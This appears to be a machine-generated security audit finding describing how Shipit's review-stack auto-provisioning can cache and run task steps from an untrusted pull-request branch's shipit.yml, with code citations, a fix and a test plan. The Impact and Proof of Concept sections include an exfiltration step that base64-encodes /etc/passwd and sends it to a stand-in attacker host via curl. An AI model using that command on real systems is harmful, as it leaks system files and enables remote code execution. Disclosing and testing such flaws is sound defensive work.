This is a critical finding: the ReviewStackAdapter confirms the attack path is real — automated review stack creation sets `branch: params.pull_request.head.ref` directly from the webhook `pull_request.head.ref` field [1](#0-0) , and this happens automatically on `pull_request` `opened` events when `review_stacks_enabled` and the provisioning policy allows it (`allow_all`, or label-based policies) [2](#0-1) .

### Title
Review-stack auto-provisioning caches and executes attacker-controlled `shipit.yml` task steps from PR head branch - (File: `app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb`, `app/models/shipit/deploy_spec.rb`)

### Summary
When a repository has review stacks enabled with an "allow all" (or label-satisfiable) provisioning policy, opening a pull request from an attacker-controlled fork causes Shipit to auto-create a `ReviewStack` whose `branch` is set directly to the PR's `head.ref` [1](#0-0) . That branch is then synced by `GithubSyncJob`/`CacheDeploySpecJob`, checking out the attacker's `shipit.yml` and caching a `DeploySpec` built from it [3](#0-2) . Any subsequent `trigger_task` call resolves task steps from that cached, attacker-authored spec verbatim [4](#0-3) [5](#0-4) .

### Finding Description
Broken binding: `task.steps == steps_approved_by_a_maintainer_in_the_mainline_shipit.yml` is violated; in reality `task.steps == steps_from_config('tasks', id)_of_cached_deploy_spec`, and `cached_deploy_spec` can be sourced from `branch = pull_request.head.ref`, a value fully controlled by whoever opens the PR (including in their own fork) [1](#0-0) .

Path:
1. Attacker opens a PR against a repository with `review_stacks_enabled` and an "allow-all" (or satisfiable label) provisioning policy — no privileged action, `pull_request` `opened` events fire the built-in `Handlers::PullRequest::OpenedHandler` [6](#0-5) .
2. `ReviewStackAdapter#create!` creates a `Stack` with `branch: params.pull_request.head.ref` [7](#0-6) , then enqueues provisioning (`ReviewStackProvisioningQueue.add`), which ultimately syncs commits and caches the deploy spec via `CacheDeploySpecJob`, checking out the PR head commit and parsing its `shipit.yml` into `cached_deploy_spec` [3](#0-2) .
3. `Stack#task_definitions`/`#find_task_definition` merge `config('tasks')` from that cached spec with no allowlist beyond variable filtering, exposing any task the attacker defined, including its literal `steps` [8](#0-7) .
4. `Stack#trigger_task` builds a `Task` whose `env` is filtered (`definition.filter_envs(env)`) but whose `steps` are not filtered at all — they come straight from `TaskDefinition` built off the attacker's `shipit.yml` [5](#0-4) .
5. Anyone with deploy permission on the review stack (which is auto-created and often self-serve for the PR author or reviewers) can call `trigger_task` and have arbitrary attacker-defined `steps` executed by `Command`/`PTY.spawn`.

Existing guards do not stop this: `verify_signature` only authenticates that the webhook truly came from GitHub for that repo/organization — it says nothing about which branch's content is trustworthy [9](#0-8) . `EnvironmentVariables#permit`/`filter_envs` only filters environment variable values, never task `steps`. There is no check comparing the PR's source (fork vs. same-repo, or author permission) before trusting `head.ref` as a `branch` to sync and cache a spec from. This differs from the regular `PushHandler`, which only syncs stacks whose `branch` already matches an existing, maintainer-configured `Stack` [10](#0-9)  — review stacks bypass that safeguard by deriving the tracked branch straight from attacker-supplied PR metadata.

### Impact Explanation
An attacker who can open a PR (unprivileged, does not require repo write access, a Shipit session, or any secret) gets a `Stack` provisioned that tracks their exact branch/fork content. Any custom task they define in that branch's `shipit.yml` (e.g., `backdoor: {steps: ['curl attacker.test/$(cat /etc/passwd | base64)']}`) becomes executable on the Shipit deploy host once triggered — this is Critical RCE via `Command`/`PTY.spawn`. The blast radius depends on the repository's `review_stacks_enabled` and provisioning-policy configuration (`allow_all` or a label an attacker's own PR can carry) — if enabled, this is repeatable against every PR the attacker opens, and does not require the PR to be merged or reviewed at all.

### Likelihood Explanation
Requires: the target repository has review stacks enabled with `provisioning_behavior_allow_all?` true, or a label-based policy the attacker can satisfy on their own PR (`labeled`/`allow_with_label`, or `prevent_with_label` where absence of a label is the default). This is an operator configuration choice, not universal, but is exactly the intended self-service workflow that review-app features are built for, making it a realistic and low-cost precondition — no secrets, no team membership, no prior stack, just opening a PR. If review stacks are disabled or gated to trusted contributors via required labels that are not attacker-assignable, this specific path is blocked (though this repo indexer could not fully confirm all label-permission checks around who may apply provisioning labels).

### Recommendation
Do not let `head.ref`/PR metadata directly become a `Stack#branch` used to check out and cache an executable spec without validating repository trust (e.g., require same-repo, non-fork PRs, or restrict review-stack auto-provisioning to PRs from users with write access/CI-approved status). Separately, sanitize or restrict `tasks[*].steps` to a maintainer-controlled allowlist independent of the head branch content, or require an explicit approval/diff review of `shipit.yml` changes to `tasks` before caching them for stacks provisioned from untrusted refs.

### Proof of Concept
Minitest plan (`test/models/shipit/webhooks/handlers/pull_request/review_stack_adapter_test.rb` or similar, no live GitHub):
1. Stub a repository with `review_stacks_enabled` true and `provisioning_behavior_allow_all?` true.
2. Build `pull_request` webhook params with `head.ref = "attacker-branch"`.
3. Call `ReviewStackAdapter.new(params, scope: repository.review_stacks).find_or_create!` and assert the created `Stack#branch == "attacker-branch"`.
4. Stub `CacheDeploySpecJob#perform` to cache a `DeploySpec` built from `'tasks' => {'backdoor' => {'steps' => ["curl attacker.test/$(cat /etc/passwd | base64)"]}}`.
5. Call `stack.trigger_task('backdoor', some_user)` and assert `Shipit::Task.last.definition.steps == ["curl attacker.test/$(cat /etc/passwd | base64)"]`, proving the unapproved step reaches the `Task`/`Command` layer verbatim.

### Citations

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L72-94)
```ruby
          def create!
            ReviewStack.transaction do
              stack = scope.create!(stack_attributes)
              stack
                .build_pull_request
                .update!(
                  github_pull_request: params.pull_request
                )
            end

            Shipit::ReviewStackProvisioningQueue.add(stack)

            @stack = stack
          end

          def stack_attributes
            {
              branch: params.pull_request.head.ref,
              environment:,
              ignore_ci: false,
              continuous_deployment: false
            }
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb (L41-46)
```ruby
          def process
            return unless respond_to_pull_request_opened?

            Shipit::Webhooks::Handlers::PullRequest::ReviewStackAdapter
              .new(params, scope: repository.review_stacks).find_or_create!
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb (L60-78)
```ruby
          def respond_to_pull_request_opened?
            params.action == "opened" &&
              provision?
          end

          def provision?
            repository.review_stacks_enabled &&
              repository.provisioning_behavior_allow_all? ||
              (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
              (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?)
          end

          def pull_request_has_provisioning_label?
            pull_request_label_names.include?(repository.provisioning_label_name)
          end

          def pull_request_label_names
            Array.new(pull_request["labels"]).map { |label| label["name"] }
          end
```

**File:** app/jobs/shipit/cache_deploy_spec_job.rb (L16-23)
```ruby
    def perform(stack)
      return if stack.inaccessible?

      commit = stack.commits.reachable.last
      commands = Commands.for(stack)
      commands.with_temporary_working_directory(commit:, recursive: false) do |path|
        stack.update!(cached_deploy_spec: DeploySpec::FileSystem.new(path, stack))
      end
```

**File:** app/models/shipit/deploy_spec.rb (L163-172)
```ruby
    def task_definitions
      discover_task_definitions.merge(config('tasks') || {}).map do |name, definition|
        TaskDefinition.new(name, coerce_task_definition(definition))
      end
    end

    def find_task_definition(id)
      definition = config('tasks', id) || discover_task_definitions[id]
      TaskDefinition.new(id, coerce_task_definition(definition) || task_not_found!(id))
    end
```

**File:** app/models/shipit/stack.rb (L139-159)
```ruby
    def trigger_task(definition_id, user, env: nil, force: false)
      definition = find_task_definition(definition_id)
      env = env.to_h

      definition.variables_with_defaults.each do |variable|
        env[variable.name] ||= variable.default
      end

      commit = last_deployed_commit.presence || commits.first
      task = tasks.create(
        user_id: user.id,
        definition:,
        until_commit_id: commit.id,
        since_commit_id: commit.id,
        env: definition.filter_envs(env),
        allow_concurrency: definition.allow_concurrency? || force,
        ignored_safeties: force
      )
      task.enqueue
      task
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/models/shipit/webhooks/handlers/push_handler.rb (L12-17)
```ruby
        def process
          stacks
            .not_archived
            .where(branch:)
            .find_each { |stack| stack.sync_github(expected_head_sha: params.after) }
        end
```
